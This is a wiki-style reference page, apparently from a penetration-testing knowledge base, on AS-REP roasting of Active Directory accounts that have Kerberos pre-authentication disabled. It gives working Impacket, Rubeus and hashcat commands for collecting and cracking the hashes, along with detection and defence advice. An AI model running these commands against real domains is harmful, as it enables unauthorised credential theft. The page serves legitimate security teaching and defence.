---
title: AS-REP roasting
slug: asreproast
---

> **TL;DR:** Any account flagged `DONT_REQ_PREAUTH` in `userAccountControl` will return a Kerberos AS-REP encrypted with the user's long-term key on request — no credentials needed — yielding an offline-crackable hash.

## What it is
Kerberos pre-authentication exists so the KDC won't emit ciphertext encrypted with the user's password-derived key before proving the requester knows that key. When pre-auth is disabled, sending an `AS-REQ` for the account returns an `AS-REP` whose `enc-part` is encrypted with the user's RC4 or AES key. The ciphertext is collected offline and cracked with hashcat, bypassing account lockout entirely.

## Preconditions / where it applies
- Network reach to a DC on TCP/UDP 88
- A list of usernames (or an authenticated session for LDAP enumeration of the flag)
- At least one account with `userAccountControl: 0x400000` (DONT_REQ_PREAUTH) — common on legacy service accounts and old MFA-bypass workarounds

## Technique
Find the targets, request the hash, crack offline.

```bash
# With creds: enumerate accounts that don't require pre-auth
GetNPUsers.py corp.local/alice:Pass -dc-ip 10.0.0.10 -request

# Unauthenticated: bring a username list
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.10 -no-pass -format hashcat
```

The hash format is hashcat mode `18200`:

```
$krb5asrep$23$svc_legacy@CORP.LOCAL:a1b2...$c3d4...
```

```bash
hashcat -m 18200 hashes.txt rockyou.txt -r rules/best64.rule
```

RC4 (`etype 23`) cracks an order of magnitude faster than AES (`17` / `18`); always request with `-e rc4` if the account permits it. Rubeus on Windows does the same operation with `Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt`.

The hash represents the offline password — once cracked you have full credentials, often for a service account with persistent rights.

## Detection and defence
- Inventory and clear the `DONT_REQ_PREAUTH` flag wherever possible; if the account legitimately needs it, give it a long random password and rotate frequently
- Detect via Windows event 4768 (TGT issued) with `Pre-Authentication Type = 0` — should be near zero in a healthy domain
- Network sensors can flag AS-REQ messages with empty `padata` (no `PA-ENC-TIMESTAMP`)
- Treat any service account with this flag as crown-jewel — protect it as if its password were already compromised

## References
- [HackTricks — AS-REP roasting](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html) — command reference
- [Hacker Recipes — AS-REP roast](https://www.thehacker.recipes/a-d/movement/kerberos/asreproast) — protocol-level walkthrough
- [Harmj0y — Roasting AS-REPs](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) — original write-up
- See also: [[kerberos]], [[kerberoasting]]
